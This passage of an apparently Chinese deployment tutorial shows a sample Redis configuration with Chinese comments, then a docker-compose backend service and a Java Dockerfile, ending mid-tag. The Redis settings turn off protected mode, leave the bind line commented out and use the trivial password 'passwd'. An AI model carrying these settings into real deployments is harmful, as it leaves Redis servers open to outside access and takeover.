class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br></pre></td><td class="code"><pre><span class="line"># Redis配置文件样例</span><br><span class="line"></span><br><span class="line"># Redis默认不是以守护进程的方式运行，可以通过该配置项修改，使用yes启用守护进程</span><br><span class="line"># 启用守护进程后，Redis会把pid写到一个pidfile中，在/var/run/redis.pid</span><br><span class="line">daemonize no</span><br><span class="line"> </span><br><span class="line"># 当Redis以守护进程方式运行时，Redis默认会把pid写入/var/run/redis.pid文件，可以通过pidfile指定</span><br><span class="line">pidfile /var/run/redis.pid</span><br><span class="line"> </span><br><span class="line"># 指定Redis监听端口，默认端口为6379</span><br><span class="line"># 如果指定0端口，表示Redis不监听TCP连接</span><br><span class="line">port 6379</span><br><span class="line"> </span><br><span class="line"># 绑定的主机地址</span><br><span class="line"># 你可以绑定单一接口，如果没有绑定，所有接口都会监听到来的连接</span><br><span class="line"># bind 0.0.0.0</span><br><span class="line"># 2、关闭保护机制</span><br><span class="line">protected-mode no</span><br><span class="line"> </span><br><span class="line"># Specify the path for the unix socket that will be used to listen for</span><br><span class="line"># incoming connections. There is no default, so Redis will not listen</span><br><span class="line"># on a unix socket when not specified.</span><br><span class="line">#</span><br><span class="line"># unixsocket /tmp/redis.sock</span><br><span class="line"># unixsocketperm 755</span><br><span class="line"></span><br><span class="line"># 当客户端闲置多长时间后关闭连接，如果指定为0，表示关闭该功能</span><br><span class="line">timeout 0</span><br><span class="line"> </span><br><span class="line"># 指定日志记录级别，Redis总共支持四个级别：debug、verbose、notice、warning，默认为verbose</span><br><span class="line"># debug (很多信息, 对开发／测试比较有用)</span><br><span class="line"># verbose (many rarely useful info, but not a mess like the debug level)</span><br><span class="line"># notice (moderately verbose, what you want in production probably)</span><br><span class="line"># warning (only very important / critical messages are logged)</span><br><span class="line">loglevel verbose</span><br><span class="line"> </span><br><span class="line"># 日志记录方式，默认为标准输出，如果配置为redis为守护进程方式运行，而这里又配置为标准输出，则日志将会发送给/dev/null</span><br><span class="line">logfile &quot;&quot;</span><br><span class="line"> </span><br><span class="line"># To enable logging to the system logger, just set &#x27;syslog-enabled&#x27; to yes,</span><br><span class="line"># and optionally update the other syslog parameters to suit your needs.</span><br><span class="line"># syslog-enabled no</span><br><span class="line"> </span><br><span class="line"># Specify the syslog identity.</span><br><span class="line"># syslog-ident redis</span><br><span class="line"> </span><br><span class="line"># Specify the syslog facility.  Must be USER or between LOCAL0-LOCAL7.</span><br><span class="line"># syslog-facility local0</span><br><span class="line"> </span><br><span class="line"># 设置数据库的数量，默认数据库为0，可以使用select &lt;dbid&gt;命令在连接上指定数据库id</span><br><span class="line"># dbid是从0到‘databases’-1的数目</span><br><span class="line">databases 16</span><br><span class="line"> </span><br><span class="line">################################ SNAPSHOTTING  #################################</span><br><span class="line"># 指定在多长时间内，有多少次更新操作，就将数据同步到数据文件，可以多个条件配合</span><br><span class="line"># Save the DB on disk:</span><br><span class="line">#</span><br><span class="line">#   save &lt;seconds&gt; &lt;changes&gt;</span><br><span class="line">#</span><br><span class="line">#   Will save the DB if both the given number of seconds and the given</span><br><span class="line">#   number of write operations against the DB occurred.</span><br><span class="line">#</span><br><span class="line">#   满足以下条件将会同步数据:</span><br><span class="line">#   900秒（15分钟）内有1个更改</span><br><span class="line">#   300秒（5分钟）内有10个更改</span><br><span class="line">#   60秒内有10000个更改</span><br><span class="line">#   Note: 可以把所有“save”行注释掉，这样就取消同步操作了</span><br><span class="line"> </span><br><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000</span><br><span class="line"> </span><br><span class="line"># 指定存储至本地数据库时是否压缩数据，默认为yes，Redis采用LZF压缩，如果为了节省CPU时间，可以关闭该选项，但会导致数据库文件变的巨大</span><br><span class="line">rdbcompression yes</span><br><span class="line"> </span><br><span class="line"># 指定本地数据库文件名，默认值为dump.rdb</span><br><span class="line">dbfilename dump.rdb</span><br><span class="line"> </span><br><span class="line"># 工作目录.</span><br><span class="line"># 指定本地数据库存放目录，文件名由上一个dbfilename配置项指定</span><br><span class="line">#</span><br><span class="line"># Also the Append Only File will be created inside this directory.</span><br><span class="line">#</span><br><span class="line"># 注意，这里只能指定一个目录，不能指定文件名</span><br><span class="line">dir ./</span><br><span class="line"> </span><br><span class="line">################################# REPLICATION #################################</span><br><span class="line"> </span><br><span class="line"># 主从复制。使用slaveof从 Redis服务器复制一个Redis实例。注意，该配置仅限于当前slave有效</span><br><span class="line"># so for example it is possible to configure the slave to save the DB with a</span><br><span class="line"># different interval, or to listen to another port, and so on.</span><br><span class="line"># 设置当本机为slav服务时，设置master服务的ip地址及端口，在Redis启动时，它会自动从master进行数据同步</span><br><span class="line"># slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># 当master服务设置了密码保护时，slav服务连接master的密码</span><br><span class="line"># 下文的“requirepass”配置项可以指定密码</span><br><span class="line"># masterauth &lt;master-password&gt;</span><br><span class="line"> </span><br><span class="line"># When a slave lost the connection with the master, or when the replication</span><br><span class="line"># is still in progress, the slave can act in two different ways:</span><br><span class="line">#</span><br><span class="line"># 1) if slave-serve-stale-data is set to &#x27;yes&#x27; (the default) the slave will</span><br><span class="line">#    still reply to client requests, possibly with out of data data, or the</span><br><span class="line">#    data set may just be empty if this is the first synchronization.</span><br><span class="line">#</span><br><span class="line"># 2) if slave-serve-stale data is set to &#x27;no&#x27; the slave will reply with</span><br><span class="line">#    an error &quot;SYNC with master in progress&quot; to all the kind of commands</span><br><span class="line">#    but to INFO and SLAVEOF.</span><br><span class="line">#</span><br><span class="line">slave-serve-stale-data yes</span><br><span class="line"> </span><br><span class="line"># Slaves send PINGs to server in a predefined interval. It&#x27;s possible to change</span><br><span class="line"># this interval with the repl_ping_slave_period option. The default value is 10</span><br><span class="line"># seconds.</span><br><span class="line">#</span><br><span class="line"># repl-ping-slave-period 10</span><br><span class="line"> </span><br><span class="line"># The following option sets a timeout for both Bulk transfer I/O timeout and</span><br><span class="line"># master data or ping response timeout. The default value is 60 seconds.</span><br><span class="line">#</span><br><span class="line"># It is important to make sure that this value is greater than the value</span><br><span class="line"># specified for repl-ping-slave-period otherwise a timeout will be detected</span><br><span class="line"># every time there is low traffic between the master and the slave.</span><br><span class="line">#</span><br><span class="line"># repl-timeout 60</span><br><span class="line"> </span><br><span class="line">################################## SECURITY ###################################</span><br><span class="line"> </span><br><span class="line"># Warning: since Redis is pretty fast an outside user can try up to</span><br><span class="line"># 150k passwords per second against a good box. This means that you should</span><br><span class="line"># use a very strong password otherwise it will be very easy to break.</span><br><span class="line"># 设置Redis连接密码，如果配置了连接密码，客户端在连接Redis时需要通过auth &lt;password&gt;命令提供密码，默认关闭</span><br><span class="line">requirepass passwd</span><br><span class="line"># Command renaming.</span><br><span class="line">#</span><br><span class="line"># It is possilbe to change the name of dangerous commands in a shared</span><br><span class="line"># environment. For instance the CONFIG command may be renamed into something</span><br><span class="line"># of hard to guess so that it will be still available for internal-use</span><br><span class="line"># tools but not available for general clients.</span><br><span class="line">#</span><br><span class="line"># Example:</span><br><span class="line">#</span><br><span class="line"># rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52</span><br><span class="line">#</span><br><span class="line"># It is also possilbe to completely kill a command renaming it into</span><br><span class="line"># an empty string:</span><br><span class="line">#</span><br><span class="line"># rename-command CONFIG &quot;&quot;</span><br><span class="line"> </span><br><span class="line">################################### LIMITS ####################################</span><br><span class="line"> </span><br><span class="line"># 设置同一时间最大客户端连接数，默认无限制，Redis可以同时打开的客户端连接数为Redis进程可以打开的最大文件描述符数，</span><br><span class="line"># 如果设置maxclients 0，表示不作限制。当客户端连接数到达限制时，Redis会关闭新的连接并向客户端返回max Number of clients reached错误信息</span><br><span class="line"># maxclients 128</span><br><span class="line"> </span><br><span class="line"># Don&#x27;t use more memory than the specified amount of bytes.</span><br><span class="line"># When the memory limit is reached Redis will try to remove keys with an</span><br><span class="line"># EXPIRE set. It will try to start freeing keys that are going to expire</span><br><span class="line"># in little time and preserve keys with a longer time to live.</span><br><span class="line"># Redis will also try to remove objects from free lists if possible.</span><br><span class="line">#</span><br><span class="line"># If all this fails, Redis will start to reply with errors to commands</span><br><span class="line"># that will use more memory, like SET, LPUSH, and so on, and will continue</span><br><span class="line"># to reply to most read-only commands like GET.</span><br><span class="line">#</span><br><span class="line"># WARNING: maxmemory can be a good idea mainly if you want to use Redis as a</span><br><span class="line"># &#x27;state&#x27; server or cache, not as a real DB. When Redis is used as a real</span><br><span class="line"># database the memory usage will grow over the weeks, it will be obvious if</span><br><span class="line"># it is going to use too much memory in the long run, and you&#x27;ll have the time</span><br><span class="line"># to upgrade. With maxmemory after the limit is reached you&#x27;ll start to get</span><br><span class="line"># errors for write operations, and this may even lead to DB inconsistency.</span><br><span class="line"># 指定Redis最大内存限制，Redis在启动时会把数据加载到内存中，达到最大内存后，Redis会先尝试清除已到期或即将到期的Key，</span><br><span class="line"># 当此方法处理后，仍然到达最大内存设置，将无法再进行写入操作，但仍然可以进行读取操作。</span><br><span class="line"># Redis新的vm机制，会把Key存放内存，Value会存放在swap区</span><br><span class="line"># maxmemory &lt;bytes&gt;</span><br><span class="line"> </span><br><span class="line"># MAXMEMORY POLICY: how Redis will select what to remove when maxmemory</span><br><span class="line"># is reached? You can select among five behavior:</span><br><span class="line">#</span><br><span class="line"># volatile-lru -&gt; remove the key with an expire set using an LRU algorithm</span><br><span class="line"># allkeys-lru -&gt; remove any key accordingly to the LRU algorithm</span><br><span class="line"># volatile-random -&gt; remove a random key with an expire set</span><br><span class="line"># allkeys-&gt;random -&gt; remove a random key, any key</span><br><span class="line"># volatile-ttl -&gt; remove the key with the nearest expire time (minor TTL)</span><br><span class="line"># noeviction -&gt; don&#x27;t expire at all, just return an error on write operations</span><br><span class="line">#</span><br><span class="line"># Note: with all the kind of policies, Redis will return an error on write</span><br><span class="line">#       operations, when there are not suitable keys for eviction.</span><br><span class="line">#</span><br><span class="line">#       At the date of writing this commands are: set setnx setex append</span><br><span class="line">#       incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd</span><br><span class="line">#       sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby</span><br><span class="line">#       zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby</span><br><span class="line">#       getset mset msetnx exec sort</span><br><span class="line">#</span><br><span class="line"># The default is:</span><br><span class="line">#</span><br><span class="line"># maxmemory-policy volatile-lru</span><br><span class="line"> </span><br><span class="line"># LRU and minimal TTL algorithms are not precise algorithms but approximated</span><br><span class="line"># algorithms (in order to save memory), so you can select as well the sample</span><br><span class="line"># size to check. For instance for default Redis will check three keys and</span><br><span class="line"># pick the one that was used less recently, you can change the sample size</span><br><span class="line"># using the following configuration directive.</span><br><span class="line">#</span><br><span class="line"># maxmemory-samples 3</span><br><span class="line"> </span><br><span class="line">############################## APPEND ONLY MODE ###############################</span><br><span class="line"> </span><br><span class="line">#</span><br><span class="line"># Note that you can have both the async dumps and the append only file if you</span><br><span class="line"># like (you have to comment the &quot;save&quot; statements above to disable the dumps).</span><br><span class="line"># Still if append only mode is enabled Redis will load the data from the</span><br><span class="line"># log file at startup ignoring the dump.rdb file.</span><br><span class="line"># 指定是否在每次更新操作后进行日志记录，Redis在默认情况下是异步的把数据写入磁盘，如果不开启，可能会在断电时导致一段时间内的数据丢失。</span><br><span class="line"># 因为redis本身同步数据文件是按上面save条件来同步的，所以有的数据会在一段时间内只存在于内存中。默认为no</span><br><span class="line"># IMPORTANT: Check the BGREWRITEAOF to check how to rewrite the append</span><br><span class="line"># log file in background when it gets too big.</span><br><span class="line"> </span><br><span class="line">appendonly no</span><br><span class="line"> </span><br><span class="line"># 指定更新日志文件名，默认为appendonly.aof</span><br><span class="line"># appendfilename appendonly.aof</span><br><span class="line"> </span><br><span class="line"># The fsync() call tells the Operating System to actually write data on disk</span><br><span class="line"># instead to wait for more data in the output buffer. Some OS will really flush</span><br><span class="line"># data on disk, some other OS will just try to do it ASAP.</span><br><span class="line"> </span><br><span class="line"># 指定更新日志条件，共有3个可选值：</span><br><span class="line"># no:表示等操作系统进行数据缓存同步到磁盘（快）</span><br><span class="line"># always:表示每次更新操作后手动调用fsync()将数据写到磁盘（慢，安全）</span><br><span class="line"># everysec:表示每秒同步一次（折衷，默认值）</span><br><span class="line"> </span><br><span class="line">appendfsync everysec</span><br><span class="line"># appendfsync no</span><br><span class="line"> </span><br><span class="line"># When the AOF fsync policy is set to always or everysec, and a background</span><br><span class="line"># saving process (a background save or AOF log background rewriting) is</span><br><span class="line"># performing a lot of I/O against the disk, in some Linux configurations</span><br><span class="line"># Redis may block too long on the fsync() call. Note that there is no fix for</span><br><span class="line"># this currently, as even performing fsync in a different thread will block</span><br><span class="line"># our synchronous write(2) call.</span><br><span class="line">#</span><br><span class="line"># In order to mitigate this problem it&#x27;s possible to use the following option</span><br><span class="line"># that will prevent fsync() from being called in the main process while a</span><br><span class="line"># BGSAVE or BGREWRITEAOF is in progress.</span><br><span class="line">#</span><br><span class="line"># This means that while another child is saving the durability of Redis is</span><br><span class="line"># the same as &quot;appendfsync none&quot;, that in pratical terms means that it is</span><br><span class="line"># possible to lost up to 30 seconds of log in the worst scenario (with the</span><br><span class="line"># default Linux settings).</span><br><span class="line">#</span><br><span class="line"># If you have latency problems turn this to &quot;yes&quot;. Otherwise leave it as</span><br><span class="line"># &quot;no&quot; that is the safest pick from the point of view of durability.</span><br><span class="line">no-appendfsync-on-rewrite no</span><br><span class="line"> </span><br><span class="line"># Automatic rewrite of the append only file.</span><br><span class="line"># Redis is able to automatically rewrite the log file implicitly calling</span><br><span class="line"># BGREWRITEAOF when the AOF log size will growth by the specified percentage.</span><br><span class="line">#</span><br><span class="line"># This is how it works: Redis remembers the size of the AOF file after the</span><br><span class="line"># latest rewrite (or if no rewrite happened since the restart, the size of</span><br><span class="line"># the AOF at startup is used).</span><br><span class="line">#</span><br><span class="line"># This base size is compared to the current size. If the current size is</span><br><span class="line"># bigger than the specified percentage, the rewrite is triggered. Also</span><br><span class="line"># you need to specify a minimal size for the AOF file to be rewritten, this</span><br><span class="line"># is useful to avoid rewriting the AOF file even if the percentage increase</span><br><span class="line"># is reached but it is still pretty small.</span><br><span class="line">#</span><br><span class="line"># Specify a precentage of zero in order to disable the automatic AOF</span><br><span class="line"># rewrite feature.</span><br><span class="line"> </span><br><span class="line">auto-aof-rewrite-percentage 100</span><br><span class="line">auto-aof-rewrite-min-size 64mb</span><br><span class="line"> </span><br><span class="line">################################## SLOW LOG ###################################</span><br><span class="line"> </span><br><span class="line"># The Redis Slow Log is a system to log queries that exceeded a specified</span><br><span class="line"># execution time. The execution time does not include the I/O operations</span><br><span class="line"># like talking with the client, sending the reply and so forth,</span><br><span class="line"># but just the time needed to actually execute the command (this is the only</span><br><span class="line"># stage of command execution where the thread is blocked and can not serve</span><br><span class="line"># other requests in the meantime).</span><br><span class="line">#</span><br><span class="line"># You can configure the slow log with two parameters: one tells Redis</span><br><span class="line"># what is the execution time, in microseconds, to exceed in order for the</span><br><span class="line"># command to get logged, and the other parameter is the length of the</span><br><span class="line"># slow log. When a new command is logged the oldest one is removed from the</span><br><span class="line"># queue of logged commands.</span><br><span class="line"> </span><br><span class="line"># The following time is expressed in microseconds, so 1000000 is equivalent</span><br><span class="line"># to one second. Note that a negative number disables the slow log, while</span><br><span class="line"># a value of zero forces the logging of every command.</span><br><span class="line">slowlog-log-slower-than 10000</span><br><span class="line"> </span><br><span class="line"># There is no limit to this length. Just be aware that it will consume memory.</span><br><span class="line"># You can reclaim memory used by the slow log with SLOWLOG RESET.</span><br><span class="line">slowlog-max-len 1024</span><br><span class="line"> </span><br><span class="line">################################ VIRTUAL MEMORY ###############################</span><br><span class="line"> </span><br><span class="line">### WARNING! Virtual Memory is deprecated in Redis 2.4</span><br><span class="line">### The use of Virtual Memory is strongly discouraged.</span><br><span class="line"> </span><br><span class="line">### WARNING! Virtual Memory is deprecated in Redis 2.4</span><br><span class="line">### The use of Virtual Memory is strongly discouraged.</span><br><span class="line"> </span><br><span class="line"># Virtual Memory allows Redis to work with datasets bigger than the actual</span><br><span class="line"># amount of RAM needed to hold the whole dataset in memory.</span><br><span class="line"># In order to do so very used keys are taken in memory while the other keys</span><br><span class="line"># are swapped into a swap file, similarly to what operating systems do</span><br><span class="line"># with memory pages.</span><br><span class="line"># 指定是否启用虚拟内存机制，默认值为no，</span><br><span class="line"># VM机制将数据分页存放，由Redis将访问量较少的页即冷数据swap到磁盘上，访问多的页面由磁盘自动换出到内存中</span><br><span class="line"># 把vm-enabled设置为yes，根据需要设置好接下来的三个VM参数，就可以启动VM了</span><br><span class="line"># vm-enabled no</span><br><span class="line"># vm-enabled yes</span><br><span class="line"> </span><br><span class="line"># This is the path of the Redis swap file. As you can guess, swap files</span><br><span class="line"># can&#x27;t be shared by different Redis instances, so make sure to use a swap</span><br><span class="line"># file for every redis process you are running. Redis will complain if the</span><br><span class="line"># swap file is already in use.</span><br><span class="line">#</span><br><span class="line"># Redis交换文件最好的存储是SSD（固态硬盘）</span><br><span class="line"># 虚拟内存文件路径，默认值为/tmp/redis.swap，不可多个Redis实例共享</span><br><span class="line"># *** WARNING *** if you are using a shared hosting the default of putting</span><br><span class="line"># the swap file under /tmp is not secure. Create a dir with access granted</span><br><span class="line"># only to Redis user and configure Redis to create the swap file there.</span><br><span class="line"># vm-swap-file /tmp/redis.swap</span><br><span class="line"> </span><br><span class="line"># With vm-max-memory 0 the system will swap everything it can. Not a good</span><br><span class="line"># default, just specify the max amount of RAM you can in bytes, but it&#x27;s</span><br><span class="line"># better to leave some margin. For instance specify an amount of RAM</span><br><span class="line"># that&#x27;s more or less between 60 and 80% of your free RAM.</span><br><span class="line"># 将所有大于vm-max-memory的数据存入虚拟内存，无论vm-max-memory设置多少，所有索引数据都是内存存储的（Redis的索引数据就是keys）</span><br><span class="line"># 也就是说当vm-max-memory设置为0的时候，其实是所有value都存在于磁盘。默认值为0</span><br><span class="line"># vm-max-memory 0</span><br><span class="line"> </span><br><span class="line"># Redis swap文件分成了很多的page，一个对象可以保存在多个page上面，但一个page上不能被多个对象共享，vm-page-size是要根据存储的数据大小来设定的。</span><br><span class="line"># 建议如果存储很多小对象，page大小最后设置为32或64bytes；如果存储很大的对象，则可以使用更大的page，如果不确定，就使用默认值</span><br><span class="line"># vm-page-size 32</span><br><span class="line"> </span><br><span class="line"># 设置swap文件中的page数量由于页表（一种表示页面空闲或使用的bitmap）是存放在内存中的，在磁盘上每8个pages将消耗1byte的内存</span><br><span class="line"># swap空间总容量为 vm-page-size * vm-pages</span><br><span class="line">#</span><br><span class="line"># With the default of 32-bytes memory pages and 134217728 pages Redis will</span><br><span class="line"># use a 4 GB swap file, that will use 16 MB of RAM for the page table.</span><br><span class="line">#</span><br><span class="line"># It&#x27;s better to use the smallest acceptable value for your application,</span><br><span class="line"># but the default is large in order to work in most conditions.</span><br><span class="line"># vm-pages 134217728</span><br><span class="line"> </span><br><span class="line"># Max number of VM I/O threads running at the same time.</span><br><span class="line"># This threads are used to read/write data from/to swap file, since they</span><br><span class="line"># also encode and decode objects from disk to memory or the reverse, a bigger</span><br><span class="line"># number of threads can help with big objects even if they can&#x27;t help with</span><br><span class="line"># I/O itself as the physical device may not be able to couple with many</span><br><span class="line"># reads/writes operations at the same time.</span><br><span class="line"># 设置访问swap文件的I/O线程数，最后不要超过机器的核数，如果设置为0，那么所有对swap文件的操作都是串行的，可能会造成比较长时间的延迟，默认值为4</span><br><span class="line"># vm-max-threads 4</span><br><span class="line"> </span><br><span class="line">############################### ADVANCED CONFIG ###############################</span><br><span class="line"> </span><br><span class="line"># Hashes are encoded in a special way (much more memory efficient) when they</span><br><span class="line"># have at max a given numer of elements, and the biggest element does not</span><br><span class="line"># exceed a given threshold. You can configure this limits with the following</span><br><span class="line"># configuration directives.</span><br><span class="line"># 指定在超过一定的数量或者最大的元素超过某一临界值时，采用一种特殊的哈希算法</span><br><span class="line"># hash-max-zipmap-entries 512</span><br><span class="line"># hash-max-zipmap-value 64</span><br><span class="line"> </span><br><span class="line"># Similarly to hashes, small lists are also encoded in a special way in order</span><br><span class="line"># to save a lot of space. The special representation is only used when</span><br><span class="line"># you are under the following limits:</span><br><span class="line">list-max-ziplist-entries 512</span><br><span class="line">list-max-ziplist-value 64</span><br><span class="line"> </span><br><span class="line"># Sets have a special encoding in just one case: when a set is composed</span><br><span class="line"># of just strings that happens to be integers in radix 10 in the range</span><br><span class="line"># of 64 bit signed integers.</span><br><span class="line"># The following configuration setting sets the limit in the size of the</span><br><span class="line"># set in order to use this special memory saving encoding.</span><br><span class="line">set-max-intset-entries 512</span><br><span class="line"> </span><br><span class="line"># Similarly to hashes and lists, sorted sets are also specially encoded in</span><br><span class="line"># order to save a lot of space. This encoding is only used when the length and</span><br><span class="line"># elements of a sorted set are below the following limits:</span><br><span class="line">zset-max-ziplist-entries 128</span><br><span class="line">zset-max-ziplist-value 64</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"># 指定是否激活重置哈希，默认为开启</span><br><span class="line">activerehashing yes</span><br><span class="line"> </span><br><span class="line">################################## INCLUDES ###################################</span><br><span class="line"> </span><br><span class="line"># 指定包含其他的配置文件，可以在同一主机上多个Redis实例之间使用同一份配置文件，而同时各实例又拥有自己的特定配置文件</span><br><span class="line"># include /path/to/local.conf</span><br><span class="line"># include /path/to/other.conf</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="四、后端Java"><a href="#四、后端Java" class="headerlink" title="四、后端Java"></a>四、后端Java</h2><p>后端项目中数据库<code>ip地址</code>位置填写yml文件中定义的<code>服务名</code>，它会自动设置为yml文件分配的ip，如图👇</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220426/后端.5xsukay8jv00.jpg" alt="后端项目"></p><p>docker-compose内后端服务</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">myweb:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">web/test1</span>     <span class="comment"># 镜像名</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span>        <span class="comment"># 表示以当前目录下的Dockerfile开始构建镜像</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8090:8090&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.4</span></span><br></pre></td></tr></table></figure><p>通过<code>depends_on</code>来定义服务之间的依赖关系，会依据依赖关系启动服务，后端服务要在数据库mysql、redis启动之后启动服务</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> java:<span class="number">8</span></span><br><span class="line"><span class="comment">#暴露的端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8090</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#把打成的jar包更名为 app.jar</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> *.jar app.jar</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#在创建app.jar</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> bash -c <span class="string">&#x27;touch /app.jar&#x27;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#执行的运行jar包命令</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;/app.jar&quot;</span>]</span></span><br></pre></td></tr></table></figure><div class="note danger 